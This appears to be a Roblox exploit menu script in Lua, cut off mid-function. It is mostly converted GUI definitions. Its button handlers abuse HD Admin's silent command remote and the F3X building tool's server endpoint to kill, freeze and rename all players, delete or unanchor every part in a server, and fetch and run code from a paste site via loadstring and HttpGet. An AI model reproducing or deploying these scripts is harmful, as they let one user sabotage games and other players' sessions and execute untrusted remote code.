	G2L["2f"] = Instance.new("TextButton", G2L["4"]);
	G2L["2f"]["TextWrapped"] = true;
	G2L["2f"]["BorderSizePixel"] = 3;
	G2L["2f"]["TextSize"] = 14;
	G2L["2f"]["TextScaled"] = true;
	G2L["2f"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["2f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
	G2L["2f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
	G2L["2f"]["Size"] = UDim2.new(0, 129, 0, 46);
	G2L["2f"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
	G2L["2f"]["Text"] = [[Mesh Disco]];
	G2L["2f"]["Position"] = UDim2.new(0.04524, 0, 0.8168, 0);
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	G2L["30"] = Instance.new("LocalScript", G2L["2f"]);
	
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextLabel
	G2L["31"] = Instance.new("TextLabel", G2L["4"]);
	G2L["31"]["TextWrapped"] = true;
	G2L["31"]["BorderSizePixel"] = 0;
	G2L["31"]["TextSize"] = 14;
	G2L["31"]["TextScaled"] = true;
	G2L["31"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
	G2L["31"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
	G2L["31"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["31"]["Size"] = UDim2.new(0, 529, 0, 46);
	G2L["31"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["31"]["Text"] = [[c00l /Scripts]];
	G2L["31"]["Position"] = UDim2.new(-0.22728, 0, 0.70145, 0);
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton
	G2L["32"] = Instance.new("TextButton", G2L["4"]);
	G2L["32"]["TextWrapped"] = true;
	G2L["32"]["BorderSizePixel"] = 3;
	G2L["32"]["TextSize"] = 14;
	G2L["32"]["TextScaled"] = true;
	G2L["32"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["32"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
	G2L["32"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
	G2L["32"]["Size"] = UDim2.new(0, 40, 0, 31);
	G2L["32"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
	G2L["32"]["Text"] = [[RE]];
	G2L["32"]["Position"] = UDim2.new(-0.00176, 0, -0.00178, 0);
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	G2L["33"] = Instance.new("LocalScript", G2L["32"]);
	
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton
	G2L["34"] = Instance.new("TextButton", G2L["4"]);
	G2L["34"]["TextWrapped"] = true;
	G2L["34"]["BorderSizePixel"] = 3;
	G2L["34"]["TextSize"] = 14;
	G2L["34"]["TextScaled"] = true;
	G2L["34"]["TextDirection"] = Enum.TextDirection.LeftToRight;
	G2L["34"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["34"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
	G2L["34"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
	G2L["34"]["Size"] = UDim2.new(0, 56, 0, 31);
	G2L["34"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
	G2L["34"]["Text"] = [[F3X]];
	G2L["34"]["Position"] = UDim2.new(0.85203, 0, -0.00042, 0);
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	G2L["35"] = Instance.new("LocalScript", G2L["34"]);
	
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton
	G2L["36"] = Instance.new("TextButton", G2L["4"]);
	G2L["36"]["TextWrapped"] = true;
	G2L["36"]["BorderSizePixel"] = 3;
	G2L["36"]["TextSize"] = 14;
	G2L["36"]["TextScaled"] = true;
	G2L["36"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["36"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
	G2L["36"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
	G2L["36"]["Size"] = UDim2.new(0, 129, 0, 22);
	G2L["36"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
	G2L["36"]["Text"] = [[Rainbow Float Pad]];
	G2L["36"]["Position"] = UDim2.new(0.59615, 0, 0.66942, 0);
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	G2L["37"] = Instance.new("LocalScript", G2L["36"]);
	
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton
	G2L["38"] = Instance.new("TextButton", G2L["4"]);
	G2L["38"]["TextWrapped"] = true;
	G2L["38"]["BorderSizePixel"] = 3;
	G2L["38"]["TextSize"] = 14;
	G2L["38"]["TextScaled"] = true;
	G2L["38"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["38"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
	G2L["38"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
	G2L["38"]["Size"] = UDim2.new(0, 129, 0, 46);
	G2L["38"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
	G2L["38"]["Text"] = [[Disco Character]];
	G2L["38"]["Position"] = UDim2.new(0.04263, 0, 0.87959, 0);
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	G2L["39"] = Instance.new("LocalScript", G2L["38"]);
	
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton
	G2L["3a"] = Instance.new("TextButton", G2L["4"]);
	G2L["3a"]["TextWrapped"] = true;
	G2L["3a"]["BorderSizePixel"] = 3;
	G2L["3a"]["TextSize"] = 14;
	G2L["3a"]["TextScaled"] = true;
	G2L["3a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["3a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
	G2L["3a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
	G2L["3a"]["Size"] = UDim2.new(0, 129, 0, 44);
	G2L["3a"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
	G2L["3a"]["Text"] = [[Nilizer]];
	G2L["3a"]["Position"] = UDim2.new(0.58832, 0, 0.42604, 0);
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	G2L["3b"] = Instance.new("LocalScript", G2L["3a"]);
	
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton
	G2L["3c"] = Instance.new("TextButton", G2L["4"]);
	G2L["3c"]["TextWrapped"] = true;
	G2L["3c"]["BorderSizePixel"] = 3;
	G2L["3c"]["TextSize"] = 14;
	G2L["3c"]["TextScaled"] = true;
	G2L["3c"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["3c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
	G2L["3c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
	G2L["3c"]["Size"] = UDim2.new(0, 129, 0, 44);
	G2L["3c"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
	G2L["3c"]["Text"] = [[Unachor all]];
	G2L["3c"]["Position"] = UDim2.new(0.04524, 0, 0.42604, 0);
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	G2L["3d"] = Instance.new("LocalScript", G2L["3c"]);
	
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton
	G2L["3e"] = Instance.new("TextButton", G2L["4"]);
	G2L["3e"]["TextWrapped"] = true;
	G2L["3e"]["BorderSizePixel"] = 3;
	G2L["3e"]["TextSize"] = 14;
	G2L["3e"]["TextScaled"] = true;
	G2L["3e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["3e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
	G2L["3e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
	G2L["3e"]["Size"] = UDim2.new(0, 129, 0, 41);
	G2L["3e"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
	G2L["3e"]["Text"] = [[RoadBlox GUI]];
	G2L["3e"]["Position"] = UDim2.new(0.04524, 0, 0.52371, 0);
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	G2L["3f"] = Instance.new("LocalScript", G2L["3e"]);
	
	
	
	-- StarterGui.page2 .Frame.ImageLabel
	G2L["40"] = Instance.new("ImageLabel", G2L["2"]);
	G2L["40"]["BorderSizePixel"] = 2;
	G2L["40"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["40"]["Image"] = [[rbxassetid://102019111197425]];
	G2L["40"]["Size"] = UDim2.new(0, 83, 0, 80);
	G2L["40"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["40"]["Position"] = UDim2.new(1.03219, 0, 0.25291, 0);
	
	
	-- StarterGui.page2 .Frame.ImageLabel
	G2L["41"] = Instance.new("ImageLabel", G2L["2"]);
	G2L["41"]["BorderSizePixel"] = 0;
	G2L["41"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["41"]["Image"] = [[rbxassetid://113455072164836]];
	G2L["41"]["Size"] = UDim2.new(0, 85, 0, 82);
	G2L["41"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["41"]["Position"] = UDim2.new(1.02872, 0, 0.46153, 0);
	
	
	-- StarterGui.page2 .Frame.page frames
	G2L["42"] = Instance.new("Frame", G2L["2"]);
	G2L["42"]["BorderSizePixel"] = 4;
	G2L["42"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
	G2L["42"]["Size"] = UDim2.new(0, 107, 0, 429);
	G2L["42"]["Position"] = UDim2.new(1, 0, 0, 0);
	G2L["42"]["BorderColor3"] = Color3.fromRGB(255, 141, 9);
	G2L["42"]["Name"] = [[page frames]];
	
	
	-- StarterGui.page2 .Frame.page frames.page2
	G2L["43"] = Instance.new("TextButton", G2L["42"]);
	G2L["43"]["TextWrapped"] = true;
	G2L["43"]["BorderSizePixel"] = 2;
	G2L["43"]["TextSize"] = 14;
	G2L["43"]["TextScaled"] = true;
	G2L["43"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["43"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
	G2L["43"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
	G2L["43"]["Size"] = UDim2.new(0, 106, 0, 53);
	G2L["43"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
	G2L["43"]["Text"] = [[Page 2]];
	G2L["43"]["Name"] = [[page2]];
	G2L["43"]["Position"] = UDim2.new(-0.00044, 0, 0.22955, 0);
	
	
	-- StarterGui.page2 .Frame.page frames.page2.LocalScript
	G2L["44"] = Instance.new("LocalScript", G2L["43"]);
	
	
	
	-- StarterGui.page2 .Frame.page frames.pg4
	G2L["45"] = Instance.new("TextButton", G2L["42"]);
	G2L["45"]["TextWrapped"] = true;
	G2L["45"]["BorderSizePixel"] = 3;
	G2L["45"]["TextSize"] = 14;
	G2L["45"]["TextScaled"] = true;
	G2L["45"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["45"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
	G2L["45"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
	G2L["45"]["Size"] = UDim2.new(0, 106, 0, 48);
	G2L["45"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
	G2L["45"]["Text"] = [[Page 5 (UNFINISHED]];
	G2L["45"]["Name"] = [[pg4]];
	G2L["45"]["Position"] = UDim2.new(-0.00251, 0, 0.11755, 0);
	
	
	-- StarterGui.page2 .Frame.page frames.pg4.LocalScript
	G2L["46"] = Instance.new("LocalScript", G2L["45"]);
	
	
	
	-- StarterGui.page2 .Frame.page frames.pag3
	G2L["47"] = Instance.new("TextButton", G2L["42"]);
	G2L["47"]["TextWrapped"] = true;
	G2L["47"]["BorderSizePixel"] = 3;
	G2L["47"]["TextSize"] = 14;
	G2L["47"]["TextScaled"] = true;
	G2L["47"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["47"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
	G2L["47"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
	G2L["47"]["Size"] = UDim2.new(0, 107, 0, 41);
	G2L["47"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
	G2L["47"]["Text"] = [[Page 3]];
	G2L["47"]["Name"] = [[pag3]];
	G2L["47"]["Position"] = UDim2.new(-0.00649, 0, 0.00666, 0);
	
	
	-- StarterGui.page2 .Frame.page frames.pag3.LocalScript
	G2L["48"] = Instance.new("LocalScript", G2L["47"]);
	
	
	
	-- StarterGui.page2 .Frame.LocalScript
	local function C_3()
	local script = G2L["3"];
		local UIS = game:GetService("UserInputService")
		local frame = script.Parent
		
		local dragging = false
		local dragInput
		local startPos
		local startFramePos
		
		local function update(input)
			local delta = input.Position - startPos
			frame.Position = UDim2.new(
				startFramePos.X.Scale,
				startFramePos.X.Offset + delta.X,
				startFramePos.Y.Scale,
				startFramePos.Y.Offset + delta.Y
			)
		end
		
		frame.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1
				or input.UserInputType == Enum.UserInputType.Touch then
				dragging = true
				startPos = input.Position
				startFramePos = frame.Position
		
				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragging = false
					end
				end)
			end
		end)
		
		frame.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement
				or input.UserInputType == Enum.UserInputType.Touch then
				dragInput = input
			end
		end)
		
		UIS.InputChanged:Connect(function(input)
			if input == dragInput and dragging then
				update(input)
			end
		end)
	end;
	task.spawn(C_3);
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	local function C_7()
	local script = G2L["7"];
		script.Parent.MouseButton1Click:Connect(function()
			
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
			local player = game.Players.LocalPlayer
			local char = player.Character
			local backpack = player.Backpack
		
			local Players = game:GetService("Players")
			local player = Players.LocalPlayer
		
			local character = player.Character or player.CharacterAdded:Wait()
		
			local storedCharacter = character
			local originalParent = storedCharacter.Parent
		
			storedCharacter.Parent = nil
		
			local player = game.Players.LocalPlayer
			local char = player.Character
			local backpack = player.Backpack
		
			local function getf3x()
				for _, v in ipairs(backpack:GetChildren()) do
					if v:FindFirstChild("SyncAPI") then
						return v
					end
				end
				for _, v in ipairs(char:GetChildren()) do
					if v:FindFirstChild("SyncAPI") then
						return v
					end
				end
		
				return nil
			end
		
			-- get all info
		
			local f3x = getf3x()
			if not f3x then
				warn("you dont have f3x skid")
			end
			local syncapi = f3x.SyncAPI
			local serverendpoint = syncapi.ServerEndpoint
		
			local function delete(part)
				local args = {
					[1] = "Remove",
					[2] = {
						[1] = part
					}
				}
				serverendpoint:InvokeServer(unpack(args))
			end
		
			local function deleteall()
				for _, v in ipairs(workspace:GetDescendants()) do
					if v:IsA("BasePart") or v:IsA("UnionOperation") then
						spawn(function()
							delete(v)
						end)
					end
				end
			end
		
			deleteall()
		
			local function getf3x()
				for _, v in ipairs(backpack:GetChildren()) do
					if v:FindFirstChild("SyncAPI") then
						return v
					end
				end
				for _, v in ipairs(char:GetChildren()) do
					if v:FindFirstChild("SyncAPI") then
						return v
					end
				end
				return nil
			end
		
			local f3x = getf3x()
			if not f3x then
				warn("you dont have f3x skid")
			end
			local syncapi = f3x.SyncAPI
			local serverendpoint = syncapi.ServerEndpoint
		
			function _(args)
				serverendpoint:InvokeServer(unpack(args))
			end
		
			local function addlight(part, brightness)
				local args = {
					[1] = "CreateLights",
					[2] = {
						[1] = {
							["Part"] = part,
							["LightType"] = "PointLight"
						}
					}
				}
				serverendpoint:InvokeServer(unpack(args))
			end
		
			local function synclight(part, brightness)
				local args = {
					[1] = "SyncLighting",
					[2] = {
						[1] = {
							["Part"] = part,
							["LightType"] = "PointLight",
							["Range"] = 60,
							["Color"] = Color3.new(1, 0, 0)
						}
					}
				}
				serverendpoint:InvokeServer(unpack(args))
			end
		
			local function fire(part) 
		
				local argsCreate = {
					[1] = "CreateDecorations",
					[2] = {
						[1] = {
							["Part"] = part,
							["DecorationType"] = "Fire"
						}
					}
				}
		
		
				local argsSync = {
					[1] = "SyncDecorate",
					[2] = {
						[1] = {
							["Part"] = part,
							["DecorationType"] = "Fire",
							["Size"] = 30,
							["Heat"] = 9,
							["Color"] = Color3.fromRGB(255, 0, 0), 
							["SecondaryColor"] = Color3.fromRGB(255, 0, 0) 
						} 
					} 
				}
		
		
				_(argsCreate)
				_(argsSync)
			end
			function MovePart(part, cf)
				local args = {
					"SyncMove",
					{
						{
							Part = part,
							CFrame = cf
						}
					}
				}
				_(args)
			end
		
			local function resize(part, size, cf)
				local args = {
					"SyncResize",
					{
						{
							Part = part,
							CFrame = cf,
							Size = size
						}
					}
				}
				_(args)
			end
		
			function SetTrans(part,int)
				local args = {
					[1] = "SyncMaterial",
					[2] = {
						[1] = {
							["Part"] = part,
							["Transparency"] = int
						}
					}
				}
				_(args)
			end
		
			local function mat(part, mate)
				local args = {
					"SyncMaterial",
					{
						{
							Part = part,
							Material = mate
						}
					}
				}
				_(args)
			end
		
			local function transparency(part, trans)
				local args = {
					"SyncMaterial",
					{
						{
							Part = part,
							Transparency = trans
						}
					}
				}
				_(args)
			end
		
			local function color(part, color)
				local args = {
					"SyncColor",
					{
						{
							Part = part,
							Color = color,
							UnionColoring = false
						}
					}
				}
				_(args)
			end
		
			local function syncmeshid(part, id)
				local args = {
					"SyncMesh",
					{
						{
							Part = part,
							MeshId = "rbxassetid://" .. id
						}
					}
				}
				_(args)
			end
		
			local function makemesh(part)
				local args = {
					"CreateMeshes",
					{
						{
							Part = part
						}
					}
				}
				_(args)
			end
		
			local function syncmeshsize(part, vectora)
				local args = {
					"SyncMesh",
					{
						{
							Part = part,
							Scale = vectora
						}
					}
				}
				_(args)
			end
		
			local function syncmeshtexture(part, id)
				local args = {
					"SyncMesh",
					{
						{
							Part = part,
							TextureId = "rbxassetid://" .. id
						}
					}
				}
				_(args)
			end
		
			local function name(part, stringa)
				local args = {
					"SetName",
					{ part },
					stringa
				}
				_(args)
			end
		
			local function lock(part, boolean)
				local args = {
					"SetLocked",
					{ part },
					boolean
				}
				_(args)
			end
		
		
		
			local function setcollision(part, booleana)
				local args = {
					"SyncCollision",
					{
						{
							Part = part,
							CanCollide = booleana
						}
					}
				}
				_(args)
			end
		
			local function setanchor(part, boolean)
				local args = {
					"SyncAnchor",
					{
						{
							Part = part,
							Anchored = boolean
						}
					}
				}
				_(args)
			end
		
			local function createdecal(part, side)
				local args = {
					"CreateTextures",
					{
						{
							Part = part,
							Face = side,
							TextureType = "Decal"
						}
					}
				}
				_(args)
			end
		
			local function setdecal(part, asset, side)
				local args = {
					"SyncTexture",
					{
						{
							Part = part,
							Face = side,
							TextureType = "Decal",
							Texture = "rbxassetid://" .. asset
						}
					}
				}
				_(args)
			end
		
			function toptexturecreate(part)
				local args = {
					[1] = "CreateTextures",
					[2] = {
						[1] = {
							["Part"] = part,
							["Face"] = Enum.NormalId.Top,
							["TextureType"] = "Texture"
						}
					}
				}
		
				_(args)
			end
			function toptextureadd(part)
				local args = {
					[1] = "SyncTexture",
					[2] = {
						[1] = {
							["Part"] = part,
							["Face"] = Enum.NormalId.Top,
							["TextureType"] = "Texture",
							["Texture"] = "rbxassetid://13199422086",
							["StudsPerTileV"] = 2,
							["StudsPerTileU"] = 2
						}
					}
				}
				_(args)
			end
		
			local function RealmV2()
				local position = CFrame.new(0, 0, 0)
				local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
				resize(base, Vector3.new(1000, 1, 1000), position)
				toptexturecreate(base)
				toptextureadd(base)
				color(base, Color3.fromRGB(0, 150, 0))
		
			end
			local function unanchorall()
				for _, v in ipairs(workspace:GetDescendants()) do
					if v:IsA("BasePart") or v:IsA("UnionOperation") then
						spawn(function()
							lock(v, false)
							setanchor(false, v)
						end)
					end
				end
			end
		
			local function realm()
				unanchorall()
				RealmV2()
			end
			realm()
			wait(1)
			storedCharacter.Parent = game.workspace
		
			
			
			
			
			
		
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
		end)
		
	end;
	task.spawn(C_7);
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	local function C_9()
	local script = G2L["9"];
		script.Parent.MouseButton1Click:Connect(function()
			
			
			loadstring(game:HttpGet("https://pastefy.app/0FIjj3R3/raw"))()
			
			
			
			
		
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
		end)
		
	end;
	task.spawn(C_9);
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	local function C_b()
	local script = G2L["b"];
		script.Parent.MouseButton1Click:Connect(function()
			
			
			
			
			-- first you want to know about hd admin remote or shit there silent hd admin command
		
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
			RequestCommandSilent:InvokeServer(";char all WHYROBLOX322")
			RequestCommandSilent:InvokeServer(";name all skyl0rdForLifeXD")
		
			--                                                           ^ put a command like ;fly
			--i just have that nga, of you want more dm me at roadblockswashere
		
			
			
		
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
		end)
		
	end;
	task.spawn(C_b);
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	local function C_d()
	local script = G2L["d"];
		script.Parent.MouseButton1Click:Connect(function()
			
			-- first you want to know about hd admin remote or shit there silent hd admin command
		
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
			RequestCommandSilent:InvokeServer(";title all skyl0rd")
			RequestCommandSilent:InvokeServer(";name me  ")
		
			--                                                           ^ put a command like ;fly
			--i just have that nga, of you want more dm me at roadblockswashere
		
			
			
			
			
			
		
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
		end)
		
	end;
	task.spawn(C_d);
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	local function C_f()
	local script = G2L["f"];
		script.Parent.MouseButton1Click:Connect(function()
			
			
			
			-- first you want to know about hd admin remote or shit there silent hd admin command
		
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
			RequestCommandSilent:InvokeServer(";char all LNickyTheDestroyer")
			RequestCommandSilent:InvokeServer(";name all LNickyTheDestroyer")
		
			--                                                           ^ put a command like ;fly
			--i just have that nga, of you want more dm me at roadblockswashere
		
			
			
			
			
		
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
		end)
		
	end;
	task.spawn(C_f);
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	local function C_11()
	local script = G2L["11"];
		script.Parent.MouseButton1Click:Connect(function()
			
			
			
			-- first you want to know about hd admin remote or shit there silent hd admin command
		
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
			RequestCommandSilent:InvokeServer(";char all gr0undl0rd1")
			RequestCommandSilent:InvokeServer(";name all gr0undl0rd")
		
			--                                                           ^ put a command like ;fly
			--i just have that nga, of you want more dm me at roadblockswashere
		
			
			
			
		
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
		end)
		
	end;
	task.spawn(C_11);
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	local function C_14()
	local script = G2L["14"];
		script.Parent.MouseButton1Click:Connect(function()
			
			
			-- first you want to know about hd admin remote or shit there silent hd admin command
		
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
			RequestCommandSilent:InvokeServer(";neon all")
			RequestCommandSilent:InvokeServer(";name all  ")
		
			--                                                           ^ put a command like ;fly
			--i just have that nga, of you want more dm me at roadblockswashere
		
			
			
			
		
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
		end)
		
	end;
	task.spawn(C_14);
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	local function C_16()
	local script = G2L["16"];
		script.Parent.MouseButton1Click:Connect(function()
			
			
			
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
			RequestCommand:InvokeServer(";r6 all")
			RequestCommand:InvokeServer(";freeze all")
			RequestCommand:InvokeServer(";kill all")
		
			
			
			
			
		
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
		end)
		
	end;
	task.spawn(C_16);
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	local function C_18()
	local script = G2L["18"];
		script.Parent.MouseButton1Click:Connect(function()
			
			
			--// Script: RC7 Cloud F3X \\ --
			--// Creator: ItsKittyyyGD \\ --
			-- CODE/SOURCE (OPEN):
		
			local player = game.Players.LocalPlayer
			local char = player.Character or player.CharacterAdded:Wait()
			local tool
		
			for _, v in player:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
		
			for _, v in game.ReplicatedStorage:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
		
			local remote = tool.SyncAPI.ServerEndpoint
		
			function _(args)
				remote:InvokeServer(unpack(args))
			end
		
			function SetCollision(part, boolean)
				local args = {"SyncCollision", {{Part = part, CanCollide = boolean}}}
				_(args)
			end
		
			function SetAnchor(boolean, part)
				local args = {"SyncAnchor", {{Part = part, Anchored = boolean}}}
				_(args)
			end
		
			function CreatePart(cf, parent)
				local args = {"CreatePart", "Normal", cf, parent}
				_(args)
			end
		
			function AddMesh(part)
				local args = {"CreateMeshes", {{Part = part}}}
				_(args)
			end
		
			function SetMesh(part, meshid)
				local args = {"SyncMesh", {{Part = part, MeshId = "rbxassetid://" .. meshid}}}
				_(args)
			end
		
			function MeshResize(part, size)
				local args = {"SyncMesh", {{Part = part, Scale = size}}}
				_(args)
			end
		
			function SetColor(part, color)
				local args = {"SyncColor", {{Part = part, Color = color, UnionColoring = false}}}
				_(args)
			end
		
			function MovePart(part, cf)
				local args = {"SyncMove", {{Part = part, CFrame = cf}}}
				_(args)
			end
		
			function CreateCloud()
				local head = char:WaitForChild("Head")
				local cf = head.CFrame + Vector3.new(0, 12, 0)
				CreatePart(cf, workspace)
				task.spawn(function()
					repeat task.wait() until (function()
						for _, v in workspace:GetDescendants() do
							if v:IsA("BasePart") and (v.Position - cf.Position).Magnitude < 0.5 then
								SetAnchor(true, v)
								SetCollision(v, false)
								SetColor(v, BrickColor.new(333).Color)
								AddMesh(v)
								SetMesh(v, "111820358")
								MeshResize(v, Vector3.new(8, 8, 8))
								task.spawn(function()
									game:GetService("RunService").RenderStepped:Connect(function()
										if char and char:FindFirstChild("Head") then
											MovePart(v, char.Head.CFrame + Vector3.new(0, 6, 0))
										end
									end)
								end)
								return true
							end
						end
					end)()
				end)
			end
		
			CreateCloud()
		
			-- i can quit because theres more scripters f3x better than me. This can be my last script but,¿who knows?
		
			
			
			
			
		
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
		end)
		
	end;
	task.spawn(C_18);
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	local function C_1a()
	local script = G2L["1a"];
		script.Parent.MouseButton1Click:Connect(function()
			
			
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
			RequestCommandSilent:InvokeServer(";r15")
			RequestCommandSilent:InvokeServer(";removehats me")
		
			RequestCommandSilent:InvokeServer(";bundle me 6732429296825")
			RequestCommandSilent:InvokeServer(";emote me 140635414785900")
			RequestCommandSilent:InvokeServer(";size me 9")
		
			
			
			
		
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
		end)
		
	end;
	task.spawn(C_1a);
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	local function C_1c()
	local script = G2L["1c"];
		script.Parent.MouseButton1Click:Connect(function()
			
			
			
			local player = game.Players.LocalPlayer
			local char = player.Character
			local tool
			for i,v in player:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
			for i,v in game.ReplicatedStorage:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
